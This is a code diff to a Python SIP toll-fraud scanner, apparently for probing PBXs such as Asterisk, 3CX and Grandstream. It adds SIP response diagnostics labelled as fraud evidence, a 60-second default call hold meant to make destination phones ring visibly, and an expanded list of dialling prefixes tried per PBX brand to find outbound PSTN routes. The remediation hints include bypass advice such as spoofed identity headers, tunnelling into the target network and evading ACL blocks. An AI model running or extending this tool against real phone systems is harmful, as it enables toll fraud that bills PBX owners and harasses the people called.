@@ -33,6 +33,361 @@ class CallResult:
     # SRTP outcome: "off" | "offered" | "accepted" | "downgraded" | "required-but-missing"
     srtp_state: str = "off"
     dtmf_digits_sent: list[str] = field(default_factory=list)
+    # True iff BYE received 200 OK — confirms full dialog teardown (not just SIP-layer 200)
+    call_confirmed: bool = False
+    # Actual seconds held before BYE was sent
+    hold_seconds_actual: float = 0.0
+    # Human-readable root-cause diagnosis (populated by diagnose_call_result)
+    failure_reason: str = ""
+    # Private Contact/Via vs public target — NAT traversal risk
+    nat_suspected: bool = False
+    # Local IP used in Contact/Via headers (for external diagnosis)
+    local_ip_used: str = ""
+
+
+def _detect_nat_risk(local_ip: str, host: str) -> bool:
+    """True if local_ip is RFC-1918 private while host appears globally routable.
+
+    When True the Contact/Via headers contain an address the PBX cannot route
+    back to — causing unacknowledged BYEs and '200 OK but no audio/ring'
+    symptoms that look like successful calls but aren't observable externally.
+    """
+    try:
+        import ipaddress as _ipa
+        _l = _ipa.ip_address(local_ip)
+        _r = _ipa.ip_address(host)
+        return bool(_l.is_private and not _r.is_private)
+    except Exception:
+        return False
+
+
+# SIP response code → (short_title, detail, remediation_hint)
+_SIP_DIAGNOSES: dict[int, tuple[str, str, str]] = {
+    100: (
+        "TRYING — dialplan reached",
+        "PBX accepted the INVITE and is processing the route. "
+        "The call is actively being set up.",
+        "",
+    ),
+    180: (
+        "RINGING — destination device rang",
+        "*** DEFINITIVE TOLL-FRAUD EVIDENCE ***\n"
+        "The dialplan routed the call to the destination. "
+        "A physical phone or PSTN endpoint was alerted.",
+        "",
+    ),
+    183: (
+        "SESSION PROGRESS — early media / PSTN ring tone",
+        "PSTN carrier accepted the call and started in-band audio. "
+        "This is strong evidence the call reached the public network.",
+        "",
+    ),
+    200: (
+        "200 OK — call established at SIP layer",
+        "PBX returned 200 OK. If no real call was observed on the destination phone:\n"
+        "  (a) NAT: scanner Contact/Via contains a private IP — PBX cannot\n"
+        "      reach back for RTP/BYE. The call may still have been placed on PSTN.\n"
+        "  (b) IMMEDIATE BYE: call duration may be 0 or too short — the phone\n"
+        "      rings for <1 second and is torn down before it can be noticed.\n"
+        "  (c) LOCAL APPLICATION: dialplan routes to an Asterisk test/echo/IVR\n"
+        "      endpoint rather than a live PSTN trunk.\n"
+        "  (d) NO ACTIVE TRUNK: PBX accepted locally but has no carrier to forward to.",
+        "Test from same network segment as PBX. Use --call-duration 60 for a longer hold. "
+        "Use --ami-check to inspect trunk status.",
+    ),
+    301: (
+        "MOVED PERMANENTLY — number redirected",
+        "PBX redirected to a different URI. The dialplan knows this number.",
+        "",
+    ),
+    302: (
+        "MOVED TEMPORARILY — number redirected",
+        "PBX redirected to a different URI. The dialplan knows this number.",
+        "",
+    ),
+    400: (
+        "BAD REQUEST — malformed SIP message",
+        "PBX rejected the INVITE due to a message syntax error. "
+        "This is typically a compatibility/formatting issue.",
+        "",
+    ),
+    401: (
+        "UNAUTHORIZED — digest authentication required",
+        "PBX demands credentials for this calling extension. "
+        "A route EXISTS in the dialplan — authentication is the only barrier. "
+        "The toll-fraud risk remains if valid credentials are obtained.",
+        "Provide --username and --password for a registered extension.",
+    ),
+    403: (
+        "FORBIDDEN — ACL / anti-fraud policy actively blocking",
+        "PBX actively rejected the call. Possible causes:\n"
+        "  • IP-based ACL blocking your source address (permit=/deny= in sip.conf)\n"
+        "  • Anti-toll-fraud dialplan rules (pattern match explicitly rejected)\n"
+        "  • Outbound route restriction (DID or trunk limitation)\n"
+        "  • SIP peer/trunk registration required but not present\n"
+        "The PBX is aware of the attempt and is actively blocking it.",
+        "Try from an allowed subnet. Check for SIP peer ACL using --ami-check. "
+        "Test with spoofed identity headers.",
+    ),
+    404: (
+        "NOT FOUND — number not in dialplan",
+        "PBX has no route for this dialled number/prefix combination.\n"
+        "Common causes:\n"
+        "  • Wrong prefix (try 9, 0, 00, +, 011, 001, 9+, 9011)\n"
+        "  • Number pattern too long or short for dialplan _X. rules\n"
+        "  • Outbound routes require a specific trunk group prefix or class of service",
+        "Run --discover-prefix to automatically probe all prefix variants.",
+    ),
+    407: (
+        "PROXY AUTH REQUIRED — SIP proxy demands credentials",
+        "A SIP proxy (not the PBX endpoint) requires authentication. "
+        "The route exists but a proxy is acting as an auth gateway.",
+        "Provide --username and --password.",
+    ),
+    408: (
+        "REQUEST TIMEOUT — trunk/destination unreachable within timer",
+        "PBX could not reach the destination before the SIP timer expired.\n"
+        "Possible causes:\n"
+        "  • PSTN trunk is down or unresponsive\n"
+        "  • NAT/firewall blocking the outbound path from PBX to carrier\n"
+        "  • Destination number is unreachable or no longer in service\n"
+        "  • B2BUA timer too short for international call setup",
+        "Check PSTN trunk status with --ami-check. Test with a known-working number.",
+    ),
+    410: (
+        "GONE — number permanently removed",
+        "The dialled number previously existed but has been decommissioned.",
+        "",
+    ),
+    480: (
+        "TEMPORARILY UNAVAILABLE — destination offline",
+        "The destination extension or endpoint is registered but currently "
+        "unavailable (device powered off, in DND, or unreachable).",
+        "",
+    ),
+    481: (
+        "CALL DOES NOT EXIST — dialog state mismatch",
+        "PBX does not recognise the Call-ID/dialog. Possible causes:\n"
+        "  • SIP ALG on a NAT device mangling Call-ID or headers\n"
+        "  • Stateful firewall dropping INVITE but not subsequent packets\n"
+        "  • PBX state was cleared (restart) between messages",
+        "Disable SIP ALG on intermediate routers. Check for stateful firewall rules.",
+    ),
+    483: (
+        "TOO MANY HOPS — Max-Forwards exceeded",
+        "The SIP Max-Forwards counter reached zero. "
+        "The message passed through too many SIP proxies/B2BUAs.",
+        "",
+    ),
+    484: (
+        "ADDRESS INCOMPLETE — dialled number too short for dialplan",
+        "PBX received fewer digits than its dialplan patterns expect.\n"
+        "The prefix is likely correct but the full number is needed.",
+        "Ensure --call-to is a complete E.164 number (e.g. +447700900000).",
+    ),
+    486: (
+        "BUSY HERE — *** REACHED DESTINATION: PHONE WAS BUSY ***",
+        "*** HIGH-CONFIDENCE TOLL-FRAUD EVIDENCE ***\n"
+        "The destination telephone rang and the line was busy.\n"
+        "The call was routed through the PSTN to the physical destination.\n"
+        "486 is definitive proof the carrier accepted the call and "
+        "the destination was alerted — it was simply engaged at the time.",
+        "",
+    ),
+    487: (
+        "REQUEST TERMINATED — call was cancelled (dry-run mode)",
+        "The INVITE was cancelled (CANCEL sent). In dry-run mode this is expected "
+        "— the dialplan was engaged and the scanner cancelled to avoid completing "
+        "the call. This is a POSITIVE FINDING: the dialplan accepted the route.",
+        "",
+    ),
+    488: (
+        "NOT ACCEPTABLE HERE — codec / media negotiation failed",
+        "PBX rejected the SDP offer. Media codec or transport did not match.\n"
+        "Possible causes:\n"
+        "  • PBX requires SRTP but scanner offered plain RTP/AVP\n"
+        "  • Codec mismatch (PBX needs G.729/G.722, offer was G.711 PCMU)\n"
+        "  • SDP format incompatibility",
+        "Try --srtp offer or verify codec capabilities.",
+    ),
+    500: (
+        "SERVER INTERNAL ERROR — PBX fault",
+        "The PBX encountered an internal error processing the INVITE. "
+        "May indicate a misconfigured dialplan, Asterisk crash, or resource exhaustion.",
+        "",
+    ),
+    503: (
+        "SERVICE UNAVAILABLE — no active PSTN trunk",
+        "PBX accepted the dialplan route but no SIP trunk/gateway is available.\n"
+        "This CONFIRMS the dialplan WOULD route the call if a trunk were up.\n"
+        "Possible causes:\n"
+        "  • No SIP trunk registered or active\n"
+        "  • All trunk channels exhausted\n"
+        "  • PSTN gateway unreachable\n"
+        "  • Trunk group authentication failed with carrier",
+        "Check SIP trunk status with --ami-check. Verify PSTN gateway connectivity.",
+    ),
+    504: (
+        "SERVER TIMEOUT — upstream trunk timed out",
+        "PBX routed the call but the upstream PSTN gateway or carrier "
+        "did not respond in time. Route was attempted — trunk is configured.",
+        "",
+    ),
+    603: (
+        "DECLINE — call explicitly rejected by destination",
+        "The called party explicitly declined the call. "
+        "This CONFIRMS the call reached the destination — strong toll-fraud evidence.",
+        "",
+    ),
+}
+
+
+def diagnose_call_result(
+    result: "CallResult",
+    *,
+    host: str = "",
+    local_ip: str = "",
+) -> str:
+    """Return a human-readable multi-line diagnostic for a toll-fraud call attempt.
+
+    Explains WHY the call succeeded/failed, what it means for risk, and
+    what steps could verify or further exploit the weakness.
+    """
+    lines: list[str] = []
+    code = result.status_code
+    reason = result.reason or ""
+    lip = local_ip or result.local_ip_used or "scanner-IP"
+
+    # ── SIP outcome ────────────────────────────────────────────────────────
+    if code is None:
+        lines.append("OUTCOME: TIMEOUT — no final SIP response received")
+        lines.append("")
+        lines.append("CAUSE ANALYSIS (most-likely first):")
+        lines.append("")
+        lines.append("  1. FIREWALL / INBOUND UDP BLOCKED:")
+        lines.append(f"     PBX at {host or 'target'} may have received your INVITE")
+        lines.append(f"     but UDP responses are blocked back to {lip}.")
+        lines.append("     Use Wireshark/tcpdump on target to confirm INVITE arrival.")
+        lines.append("")
+        if result.nat_suspected or (local_ip and host):
+            lines.append("  2. NAT TRAVERSAL FAILURE (LIKELY):")
+            lines.append(f"     Your Contact/Via header advertises {lip} (private RFC-1918).")
+            lines.append(f"     The PBX ({host}) cannot route SIP responses to a private address.")
+            lines.append("     All responses are sent to an unreachable destination.")
+            lines.append("")
+        lines.append("  3. SIP ALG INTERFERENCE:")
+        lines.append("     An intermediate router's SIP Application Layer Gateway (ALG)")
+        lines.append("     may be mangling or silently dropping SIP packets.")
+        lines.append("     → Disable SIP ALG on all routers between scanner and PBX.")
+        lines.append("")
+        lines.append("  4. RATE LIMITING / FAIL2BAN:")
+        lines.append("     PBX may be silently dropping packets from your source IP")
+        lines.append("     due to fail2ban, iptables, or built-in SIP flood protection.")
+        lines.append("")
+        lines.append("  FIXES:")
+        lines.append("  → Test from the same L2 network segment as the PBX.")
+        lines.append("  → Use SSH/VPN tunnel into target network before scanning.")
+        lines.append("  → Use --stun-auto to discover your public IP for Contact headers.")
+        lines.append("  → Disable SIP ALG on all intermediate routers.")
+    else:
+        diag = _SIP_DIAGNOSES.get(code)
+        if diag:
+            title, detail, remediation = diag
+            lines.append(f"OUTCOME: {code} {reason}")
+            lines.append(f"         {title}")
+            lines.append("")
+            lines.append("CAUSE ANALYSIS:")
+            for dline in detail.split("\n"):
+                lines.append(f"  {dline}")
+            if remediation:
+                lines.append("")
+                lines.append("RECOMMENDED ACTIONS:")
+                for rline in remediation.split("\n"):
+                    lines.append(f"  → {rline}")
+        else:
+            lines.append(f"OUTCOME: {code} {reason}")
+            lines.append(f"         (see RFC 3261 §21 for {code // 100}xx class semantics)")
+
+    # ── NAT warning for 200 OK without BYE ack ────────────────────────────
+    if code == 200 and not result.call_confirmed:
+        lines.append("")
+        lines.append("WARNING — BYE NOT ACKNOWLEDGED:")
+        lines.append("  200 OK was received but no 200 response to our BYE was seen.")
+        lines.append(f"  Contact/Via header advertised: {lip}")
+        if result.nat_suspected:
+            lines.append(f"  Target PBX: {host} (public/non-private IP)")
+            lines.append("  → Your private Contact IP is unreachable from the PBX.")
+            lines.append("    The call MAY have been placed on the PSTN but audio and")
+            lines.append("    BYE routing cannot flow back to you through NAT.")
+            lines.append("    This is the most common cause of '200 OK but no call seen'.")
+        else:
+            lines.append("  → Even without confirmed NAT, check for SIP ALG or firewall.")
+            lines.append("    The BYE may have been dropped by a stateful NAT device.")
+
+    # ── Hold time note for 200 OK / confirmed calls ────────────────────────
+    if code == 200:
+        lines.append("")
+        if result.hold_seconds_actual > 0:
+            lines.append(f"HOLD TIME: {result.hold_seconds_actual:.1f}s before BYE was sent.")
+            lines.append("  If the phone did not ring, the call was likely routed to a local")
+            lines.append("  application (echo test, IVR) rather than a PSTN trunk.")
+        else:
+            lines.append("HOLD TIME: 0s — BYE sent immediately after 200 OK.")
+            lines.append("  With an immediate BYE the phone may ring for <0.5s only.")
+            lines.append("  Use --call-duration 60 to hold the call for 60 seconds so")
+            lines.append("  the destination phone rings visibly for an extended period.")
+
+    # ── Confirmation status ────────────────────────────────────────────────
+    if code is not None and 200 <= code < 300:
+        lines.append("")
+        if result.call_confirmed:
+            lines.append(
+                f"DIALOG CONFIRMED: BYE acknowledged — full RFC 3261 dialog lifecycle "
+                f"complete. Hold: {result.hold_seconds_actual:.1f}s."
+            )
+        else:
+            lines.append("DIALOG UNCONFIRMED: BYE was sent but no 200 response received.")
+            lines.append("  This does NOT mean the call failed — it means the BYE")
+            lines.append("  acknowledgement could not be tracked (NAT or PBX behaviour).")
+
+    # ── Risk summary ───────────────────────────────────────────────────────
+    lines.append("")
+    lines.append("TOLL-FRAUD RISK ASSESSMENT:")
+    if result.success and result.call_confirmed:
+        lines.append("  ▶ CRITICAL — 200 OK + BYE acknowledged (full dialog complete)")
+        lines.append("  ▶ PSTN CALL: CONFIRMED PLACED AND COMPLETED")
+    elif result.success:
+        lines.append("  ▶ CRITICAL — 200 OK received (call established at SIP layer)")
+        lines.append("  ▶ PSTN CALL: PROBABLE — PBX accepted routing (verify locally)")
+    elif code == 486:
+        lines.append("  ▶ CRITICAL — 486 Busy = destination phone rang on PSTN")
+        lines.append("  ▶ PSTN CALL: CONFIRMED PLACED (carrier accepted)")
+    elif code in (180, 183):
+        lines.append("  ▶ HIGH — Provisional = dialplan routed toward PSTN")
+        lines.append("  ▶ PSTN CALL: PROBABLE")
+    elif code == 487:
+        lines.append("  ▶ HIGH — Dialplan accepted route (dry-run CANCEL)")
+        lines.append("  ▶ PSTN CALL: WOULD BE PLACED with non-dry-run INVITE")
+    elif code in (401, 407):
+        lines.append("  ▶ MEDIUM — Route exists, authentication required")
+        lines.append("  ▶ PSTN CALL: POSSIBLE with valid credentials")
+    elif code == 403:
+        lines.append("  ▶ MEDIUM — Actively blocked by ACL/anti-fraud policy")
+        lines.append("  ▶ PSTN CALL: BLOCKED currently — may be bypassed from allowed IP")
+    elif code == 503:
+        lines.append("  ▶ MEDIUM — Dialplan route confirmed, PSTN trunk missing")
+        lines.append("  ▶ PSTN CALL: BLOCKED (no trunk) — dialplan is vulnerable")
+    elif result.reached_dialplan:
+        lines.append(f"  ▶ HIGH — Dialplan reached ({code} {reason})")
+        lines.append("  ▶ PSTN CALL: ATTEMPTED but rejected at carrier/routing level")
+    elif code is None:
+        lines.append("  ▶ UNKNOWN — No SIP response (firewall/NAT most likely)")
+        lines.append("  ▶ PSTN CALL: UNKNOWN — cannot determine without response")
+    else:
+        lines.append(f"  ▶ LOW — Rejected at SIP layer ({code})")
+        lines.append("  ▶ PSTN CALL: REJECTED")
+
+    return "\n".join(lines)
 
 
 def _build_sdp(local_ip: str, rtp_port: int = 49170,
@@ -66,7 +421,7 @@ def place_call(
     timeout: float = 5.0,
     dry_run: bool = False,
     max_wait: float = 10.0,
-    call_duration: float = 0.0,   # seconds to hold before BYE (0 = immediate)
+    call_duration: float = 60.0,  # seconds to hold before BYE (default 60 = 1 min)
     traffic_log=None,
     # Identity / spoof primitives
     pai: str | None = None,
@@ -88,6 +443,7 @@ def place_call(
     Grandstream toll-fraud demonstrations.
     """
     local_ip = source_ip or local_ip_for(host)
+    nat_suspected = _detect_nat_risk(local_ip, host)
     # Determine bind IP: never bind to a public/NAT address (use INADDR_ANY)
     try:
         import ipaddress as _ip
@@ -96,6 +452,8 @@ def place_call(
         bind_ip = local_ip
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.settimeout(timeout)
+    bye_confirmed = False
+    hold_seconds_actual = 0.0
 
     bound = False
     if source_port_range:
@@ -287,10 +645,12 @@ def place_call(
                 send(ack)
                 trace.append("> ACK")
 
-                if call_duration > 0:
-                    hold_s = max(0.0, min(call_duration, 3600.0))
-                    trace.append(f"* Call established — holding {hold_s:.0f}s then BYE")
-                    _hold_deadline = time.monotonic() + hold_s
+                # ---- Hold phase (listen for PBX-initiated BYE while holding) ----
+                _hold_s = max(0.0, min(call_duration, 3600.0))
+                if _hold_s > 0:
+                    trace.append(f"* Call established — holding {_hold_s:.0f}s then BYE")
+                    _hold_start = time.monotonic()
+                    _hold_deadline = _hold_start + _hold_s
                     s.settimeout(1.0)
                     while time.monotonic() < _hold_deadline:
                         try:
@@ -298,12 +658,19 @@ def place_call(
                             _pr = sip.parse_response(_pkt)
                             if _pr:
                                 trace.append(f"< (hold) {_pr.status_code} {_pr.reason}")
+                                # PBX tore down call during hold — record and exit
+                                if _pr.status_code and _pr.status_code >= 400:
+                                    break
                         except socket.timeout:
                             pass
                         except OSError:
                             break
+                    hold_seconds_actual = min(time.monotonic() - _hold_start, _hold_s)
                     s.settimeout(timeout)
+                else:
+                    trace.append("* Call established — immediate BYE (0s hold)")
 
+                # ---- Optional SIP-INFO DTMF ----
                 dtmf_sent: list[str] = []
                 bye_cseq = ack_cseq + 1
                 if dtmf_digits:
@@ -337,6 +704,7 @@ def place_call(
                     except Exception as exc:
                         trace.append(f"! SIP-INFO DTMF failed: {exc}")
 
+                # ---- BYE + await acknowledgment (RFC 3261 §15.1) ----
                 bye = sip.build_message(
                     "BYE", uri,
                     from_user=call_from, to_user=call_to,
@@ -347,6 +715,25 @@ def place_call(
                 )
                 send(bye)
                 trace.append("> BYE")
+
+                # Wait up to 5 s for the PBX to acknowledge our BYE (200 OK).
+                # A missing ack usually means NAT — the PBX cannot route back to
+                # our private Contact IP.  We still count the call as a finding
+                # but flag call_confirmed=False so the diagnostic report explains why.
+                _bye_deadline = time.monotonic() + min(timeout, 5.0)
+                s.settimeout(min(timeout, 2.0))
+                while time.monotonic() < _bye_deadline:
+                    _bd = recv_one()
+                    if _bd:
+                        _br = sip.parse_response(_bd)
+                        if _br:
+                            trace.append(f"< {_br.status_code} {_br.reason} (BYE ack)")
+                            if 200 <= _br.status_code < 300:
+                                bye_confirmed = True
+                                break
+                if not bye_confirmed:
+                    trace.append("! BYE not acknowledged (NAT or firewall suspected)")
+                s.settimeout(timeout)
 
                 # Smuggle DTMF list onto response for the result builder
                 final._dtmf_sent = dtmf_sent  # type: ignore[attr-defined]
@@ -386,8 +773,10 @@ def place_call(
         return CallResult(
             success=False, reached_dialplan=reached_dialplan,
             status_code=None, reason="timeout",
-            evidence="no final response before max_wait",
+            evidence="no final response before max_wait (firewall/NAT suspected)",
             sip_trace=trace, srtp_state=srtp_state,
+            nat_suspected=nat_suspected,
+            local_ip_used=local_ip,
         )
 
     success = (200 <= final.status_code < 300) or (dry_run and reached_dialplan)
@@ -398,10 +787,16 @@ def place_call(
     if success and dry_run:
         evidence += " (dry-run: dialplan engaged at provisional)"
     elif success:
-        held = f"; held {call_duration:.0f}s" if call_duration > 0 else "; immediate"
-        evidence += f" (200 OK — call established{held} BYE)"
+        if hold_seconds_actual > 0:
+            evidence += f" (200 OK — held {hold_seconds_actual:.0f}s"
+            evidence += " — BYE acked)" if bye_confirmed else " — BYE unacked/NAT)"
+        else:
+            evidence += " (200 OK — immediate BYE"
+            evidence += " — acked)" if bye_confirmed else " — unacked/NAT)"
     if srtp_state != "off":
         evidence += f" [srtp={srtp_state}]"
+    if nat_suspected:
+        evidence += " [NAT-suspected]"
 
     return CallResult(
         success=success,
@@ -412,6 +807,10 @@ def place_call(
         sip_trace=trace,
         srtp_state=srtp_state,
         dtmf_digits_sent=getattr(final, "_dtmf_sent", []),
+        call_confirmed=bye_confirmed,
+        hold_seconds_actual=hold_seconds_actual,
+        nat_suspected=nat_suspected,
+        local_ip_used=local_ip,
     )
 
 
@@ -426,23 +825,31 @@ DIALPLAN_PREFIXES: list[str] = [
     "9",     # North American outbound (FreePBX/Asterisk default)
     "0",     # Europe/PSTN single-zero
     "00",    # European IDD
-    "00+",   # IDD with embedded plus — some Asterisk/FreeSWITCH dialplans
-    "+",     # E.164 plus notation
+    "+",     # E.164 plus notation (separate from 00)
     "1",     # legacy/direct North American
     "011",   # North American IDD
     "001",   # alternate North American IDD
     "8",     # post-Soviet/CIS (Russia, Ukraine, Kazakhstan)
     "0011",  # Australian IDD
+    "9+",    # North American + E.164 combined (some FreePBX/Asterisk configs)
+    "9011",  # North American IDD via '9' outbound prefix
+    "9001",  # alternate North American IDD via '9' outbound prefix
+    "90",    # European/hotel PBX outbound via '9' prefix
+    "810",   # post-Soviet trunk + IDD (Russia CIS: 8=trunk, 10=IDD)
+    "0+",    # European E.164 hybrid (some 3CX / Yealink provisioning)
+    "81",    # CIS abbreviated IDD (8 = trunk, 1 = IDD start)
+    "0012",  # legacy North American IDD variant
+    "9+1",   # North American E.164 via 9 outbound (some hosted PBX)
 ]
 
 # Platform-tuned prefix order: lead with the most likely prefix for each platform.
 _FINGERPRINT_PREFIX_HINTS: dict[str, list[str]] = {
-    "FreePBX":     ["9", "", "0", "00", "00+", "+", "1", "011", "001", "8", "0011"],
-    "Asterisk":    ["9", "", "0", "00", "00+", "+", "1", "011", "001", "8", "0011"],
-    "3CX":         ["0", "9", "", "00", "00+", "+", "1", "011", "001"],
-    "Grandstream": ["9", "0", "", "00", "00+", "+", "1", "011"],
-    "Mitel":       ["9", "8", "0", "", "00", "00+", "+", "1", "011"],
-    "Sangoma":     ["9", "", "0", "00", "00+", "+", "1", "011", "001"],
+    "FreePBX":     ["9", "", "0", "00", "+", "1", "011", "001", "9+", "9011", "9001", "8", "0011"],
+    "Asterisk":    ["9", "", "0", "00", "+", "1", "011", "001", "9+", "9011", "9001", "8", "0011"],
+    "3CX":         ["0", "9", "", "00", "+", "1", "0+", "011", "001", "90"],
+    "Grandstream": ["9", "0", "", "00", "+", "1", "011", "90", "001"],
+    "Mitel":       ["9", "8", "0", "", "00", "+", "1", "011", "810", "81"],
+    "Sangoma":     ["9", "", "0", "00", "+", "1", "011", "001", "9+", "9011"],
 }
 
 
